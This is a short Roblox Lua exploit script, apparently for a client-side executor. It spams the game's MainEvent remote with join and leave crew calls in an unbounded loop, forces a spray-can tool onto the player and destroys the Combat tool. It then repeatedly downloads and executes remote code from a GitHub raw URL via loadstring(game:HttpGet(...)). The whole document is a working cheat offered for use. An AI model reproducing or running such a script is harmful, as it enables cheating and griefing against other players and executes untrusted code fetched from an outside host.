getgenv().Cheese = true


game.RunService.Stepped:Connect(
    function()
    
while getgenv().Cheese == true do
        game.ReplicatedStorage.MainEvent:FireServer("JoinCrew", groupID)
        game.ReplicatedStorage.MainEvent:FireServer("LeaveCrew")
        game.Players.LocalPlayer.Backpack:FindFirstChild("[SprayCan]").Parent = game.Players.LocalPlayer.Character
    end
end
)
local a = 0
while wait(0.1) do
    a = a + 1
    if a > 100 then
                getgenv().Cheese = false
                wait(3)
                game.Players.LocalPlayer.Backpack.Combat:Destroy()
                while true do
                loadstring(game:HttpGet('https://raw.githubusercontent.com/devforkronos/final/main/bring.lua'))()
            end
    end
end